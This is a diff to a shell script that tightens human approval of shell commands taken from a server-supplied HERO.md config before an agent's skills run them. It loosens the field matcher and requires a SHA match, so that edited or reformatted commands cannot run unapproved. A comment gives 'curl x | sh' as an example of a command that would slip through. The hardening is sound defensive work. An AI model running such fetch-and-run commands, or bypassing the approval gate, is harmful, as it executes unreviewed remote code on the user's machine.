@@ -3655,20 +3655,26 @@ hero_srv_inbox_count() { # STORE [claimed]
 
 # ----- config, fleet, audit
 
-# Every HERO.md line a skill passes to a shell, as `BLOCK<TAB>KEY<TAB>VALUE` in
-# file order: `task-runner` and any `*-command` key (test-command, dev-command,
-# ...). BLOCK is the nearest `###` or `##` heading above the line. Fenced
-# blocks are skipped, as the connection reader skips them.
+# Every HERO.md line naming a field a skill passes to a shell, as
+# `BLOCK<TAB>KEY<TAB>VALUE` in file order: `task-runner` and any `*-command`
+# key (test-command, dev-command, ...). BLOCK is the nearest `###` or `##`
+# heading above the line, `-` above the first one (an empty field would be
+# swallowed by `IFS=$'\t' read`). An agent reads the whole file, not
+# hero_md_field's strict form, so the match is loose on purpose: any bullet,
+# indent, case, backticks or bold around the key, and lines inside fences.
+# Narrow it and `  - **Test-Command**: curl x | sh` runs unapproved.
 _hero_srv_command_fields() { # FILE
   [ -r "$1" ] || return 0
   awk '
-    /^```/ { fence = !fence; next }
-    fence  { next }
-    /^##+ / { blk = $0; sub(/^#+ +/, "", blk); sub(/[[:space:]]+$/, "", blk); next }
-    /^- (task-runner|[A-Za-z0-9_-]+-command):/ {
-      k = $0; sub(/^- /, "", k); sub(/:.*/, "", k)
-      v = $0; sub(/^[^:]*: */, "", v)
-      printf "%s\t%s\t%s\n", blk, k, v
+    /^[[:space:]]*```/ { fence = !fence }
+    !fence && /^##+ / { blk = $0; sub(/^#+ +/, "", blk); sub(/[[:space:]]+$/, "", blk); next }
+    /^[[:space:]]*[-*+][[:space:]]+/ {
+      l = $0; sub(/^[[:space:]]*[-*+][[:space:]]+/, "", l)
+      i = index(l, ":"); if (!i) next
+      k = substr(l, 1, i - 1); gsub(/[`*[:space:]]/, "", k); k = tolower(k)
+      if (k != "task-runner" && k !~ /^[a-z0-9_-]+-command$/) next
+      v = substr(l, i + 1); sub(/^[[:space:]]+/, "", v)
+      printf "%s\t%s\t%s\n", (blk == "" ? "-" : blk), k, v
     }
   ' "$1"
 }
@@ -3713,18 +3719,28 @@ hero_srv_commands_approved() { # ROOT FILE
     sed 1d "$rec" 2>/dev/null | while IFS=$'\t' read -r b k v; do
       printf '%s\n' "$cur" | grep -qxF "$b	$k	$v" || printf '  was approved: [%s] %s: %s\n' "$b" "$k" "$v"
     done
-    echo "hero: after the person confirms them, run hero_srv_commands_approve $1"
+    echo "hero: after the person confirms them, run hero_srv_commands_approve $1 $now"
   } >&2
   return 3
 }
 
-# Record the command fields now rendered for ROOT as approved. The caller has
-# shown them to a person and got a yes; an unattended run never calls this.
-hero_srv_commands_approve() { # ROOT
-  local rec cache cur
+# Record the command fields now rendered for ROOT as approved, only when they
+# still hash to SHA, the value hero_srv_commands_approved printed beside the
+# fields the person saw. Without SHA, any config read in between (this session
+# or another) refetches the cache, and a later server edit is what gets
+# approved. The caller has shown the fields to a person and got a yes; an
+# unattended run never calls this.
+hero_srv_commands_approve() { # ROOT SHA
+  local rec cache cur now
+  [ -n "${2:-}" ] || { echo "hero_srv_commands_approve: give the sha256 printed with the fields the person approved" >&2; return 1; }
   rec=$(_hero_srv_approval_file "$1") || return 1
   cache=$(hero_srv_cache "$1") || return 1
   cur=$(_hero_srv_command_fields "$cache/HERO.md")
+  now=$(printf '%s\n' "$cur" | _hero_sha256)
+  if [ "$now" != "$2" ]; then
+    echo "hero_srv_commands_approve: the server's command fields for ${1##*/} changed since they were shown; nothing approved. Read the config again and show the person the new fields" >&2
+    return 3
+  fi
   mkdir -p "${rec%/*}" && chmod 700 "${rec%/*}" || return 1
   ( umask 077; { printf '%s\n' "$cur" | _hero_sha256; printf '%s\n' "$cur" | sed '/^$/d'; } > "$rec.tmp" ) || return 1
   mv "$rec.tmp" "$rec" && chmod 600 "$rec"
